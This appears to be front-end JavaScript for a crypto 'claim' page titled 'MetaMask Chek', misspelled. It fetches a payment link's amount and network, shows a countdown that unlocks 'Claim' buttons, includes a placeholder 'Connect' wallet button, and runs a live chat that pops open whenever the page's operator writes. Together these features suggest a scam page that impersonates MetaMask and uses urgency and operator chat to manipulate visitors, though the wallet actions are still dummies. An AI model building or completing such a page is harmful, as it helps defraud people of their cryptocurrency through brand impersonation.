const params = new URLSearchParams(location.search);
const idFromUrl = params.get("id");

function money(amount){
  const n = Number(amount);
  if (Number.isFinite(n)) return "$" + n.toLocaleString("en-US");
  return "$" + String(amount);
}

function renderMsgs(list){
  const box = document.getElementById("chatMessages");
  box.innerHTML = "";
  for(const m of (list || [])){
    const row = document.createElement("div");
    row.className = "msg " + (m.from === "visitor" ? "me" : "them");
    row.textContent = m.text;
    box.appendChild(row);
  }
  box.scrollTop = box.scrollHeight;
}

function poll(linkId, threadId, onMessages){
  fetch(`/api/support/poll?linkId=${encodeURIComponent(linkId)}&threadId=${encodeURIComponent(threadId)}`)
    .then(r => r.json())
    .then(d => {
      if (!d?.ok) return;
      const messages = d.messages || [];
      renderMsgs(messages);
      if (onMessages) onMessages(messages);
    })
    .catch(()=>{})
    .finally(()=> setTimeout(()=>poll(linkId, threadId, onMessages), 1500));
}

function sendMsg(linkId, threadId, text){
  return fetch("/api/support/send", {
    method:"POST",
    headers:{ "content-type":"application/json" },
    body: JSON.stringify({ linkId, threadId, text })
  });
}

// fill both frames if elements exist
function setText(id, value){
  const el = document.getElementById(id);
  if (el) el.textContent = value;
}

function setDisplay(id, visible){
  const el = document.getElementById(id);
  if (!el) return;
  el.style.display = visible ? "" : "none";
}

function formatNetwork(network){
  const labels = {
    trc20: "TRC20",
    erc20: "ERC20",
    sol: "SOL",
    bep20: "BEP20",
  };
  return labels[String(network || "").toLowerCase()] || String(network || "").toUpperCase();
}

function wireDummyButton(el){
  if(!el) return;
  el.addEventListener("click", ()=> alert("Later (dummy for now)."));
  el.addEventListener("keydown", (e)=>{ if(e.key==="Enter") alert("Later (dummy for now)."); });
}

function formatRemaining(ms){
  const totalSeconds = Math.max(0, Math.floor(ms / 1000));
  const mm = String(Math.floor(totalSeconds / 60)).padStart(2, "0");
  const ss = String(totalSeconds % 60).padStart(2, "0");
  return `${mm}:${ss}`;
}

function setClaimEnabled(el, enabled){
  if(!el) return;
  if(enabled){
    el.style.pointerEvents = "";
    el.style.opacity = "";
    el.setAttribute("tabindex", "0");
    return;
  }
  el.style.pointerEvents = "none";
  el.style.opacity = "0.7";
  el.setAttribute("tabindex", "-1");
}

(async function main(){
  if(!idFromUrl) return;

  // Mobile burger dropdown
  const burgerBtn = document.getElementById("burgerBtn");
  const mobileMenu = document.getElementById("mobileMenu");
  if (burgerBtn && mobileMenu){
    const setMenuOpen = (open)=>{
      mobileMenu.classList.toggle("is-open", open);
      burgerBtn.setAttribute("aria-expanded", open ? "true" : "false");
    };

    burgerBtn.addEventListener("click", ()=>{
      const open = !mobileMenu.classList.contains("is-open");
      setMenuOpen(open);
    });

    document.addEventListener("click", (e)=>{
      if(!mobileMenu.classList.contains("is-open")) return;
      if(mobileMenu.contains(e.target) || burgerBtn.contains(e.target)) return;
      setMenuOpen(false);
    });
  }

  // Fetch link data
  const r = await fetch(`/api/link?id=${encodeURIComponent(idFromUrl)}`);
  const data = await r.json();
  if(!data?.ok){
    document.body.innerHTML = "Link not found";
    return;
  }
  const linkData = {
    ...data,
    currency: data.currency ?? null,
    network: data.network ?? null,
  };

  // Fill Desktop
  setText("checkTitle", `MetaMask Chek #${linkData.id}`);
  setText("amount", money(linkData.amount));
  const createdAt = Number(linkData.createdAt);
  const hasTimer = linkData.durationSeconds !== null && linkData.durationSeconds !== undefined;
  const durationSeconds = hasTimer ? Number(linkData.durationSeconds) : null;
  const expiresAt = hasTimer
    ? (Number(linkData.expiresAt) || (createdAt + durationSeconds * 1000))
    : null;

  // Fill Mobile
  setText("checkTitle_m", `MetaMask Chek #${linkData.id}`);
  setText("amount_m", money(linkData.amount));

  // Dummy buttons
  const btnClaim = document.getElementById("btnClaim");
  const btnClaimM = document.getElementById("btnClaim_m");
  const claimTimer = document.getElementById("claimTimer");
  const claimTimerM = document.getElementById("claimTimer_m");
  wireDummyButton(document.getElementById("btnConnect"));
  wireDummyButton(btnClaim);
  wireDummyButton(btnClaimM);

  function tick(){
    const remaining = Math.max(0, expiresAt - Date.now());
    const label = formatRemaining(remaining);
    setText("claimTimer", label);
    setText("claimTimer_m", label);

    const active = remaining > 0;
    setClaimEnabled(btnClaim, active);
    setClaimEnabled(btnClaimM, active);
  }

  if (hasTimer) {
    setDisplay("expiresText", false);
    setDisplay("expiresText_m", false);
    setDisplay("claimTimer", true);
    setDisplay("claimTimer_m", true);
    tick();
    setInterval(tick, 1000);
  } else {
    const currencyLine = `currency: ${String(linkData.currency || "").toUpperCase()} (${formatNetwork(linkData.network)})`;
    setText("expiresText", currencyLine);
    setText("expiresText_m", currencyLine);
    setDisplay("expiresText", true);
    setDisplay("expiresText_m", true);
    setDisplay("claimTimer", false);
    setDisplay("claimTimer_m", false);
    setClaimEnabled(btnClaim, true);
    setClaimEnabled(btnClaimM, true);
  }

  // Support chat open/close
  const panel = document.getElementById("chatPanel");
  const fab = document.getElementById("chatFab");
  const close = document.getElementById("chatClose");
  const input = document.getElementById("chatMsg");
  const send = document.getElementById("chatSend");

  const linkId = String(linkData.id);
  const threadId = "main";
  const ownerSeenKey = `greenland_last_seen_owner_${linkId}_${threadId}`;
  let lastSeenOwnerTs = Number(localStorage.getItem(ownerSeenKey) || 0);

  function openChat(){
    panel.classList.remove("hidden");
    panel.setAttribute("aria-hidden", "false");
    input?.focus();
  }
  function closeChat(){
    panel.classList.add("hidden");
    panel.setAttribute("aria-hidden", "true");
  }

  function isChatHidden(){
    return panel.classList.contains("hidden");
  }

  function handleIncomingOwnerMessages(messages){
    const latestOwnerTs = messages
      .filter((m)=> m.from === "owner" && Number(m.ts) > 0)
      .reduce((maxTs, m)=> Math.max(maxTs, Number(m.ts)), 0);

    if (latestOwnerTs <= lastSeenOwnerTs) return;

    lastSeenOwnerTs = latestOwnerTs;
    localStorage.setItem(ownerSeenKey, String(lastSeenOwnerTs));

    if (isChatHidden()) {
      openChat();
    }
  }

  fab.addEventListener("click", openChat);
  close.addEventListener("click", closeChat);

  async function doSend(){
    const text = input.value.trim();
    if(!text) return;
    input.value = "";
    await sendMsg(linkId, threadId, text);
  }

  send.addEventListener("click", doSend);
  input.addEventListener("keydown", (e)=>{ if(e.key==="Enter") doSend(); });

  poll(linkId, threadId, handleIncomingOwnerMessages);
})();
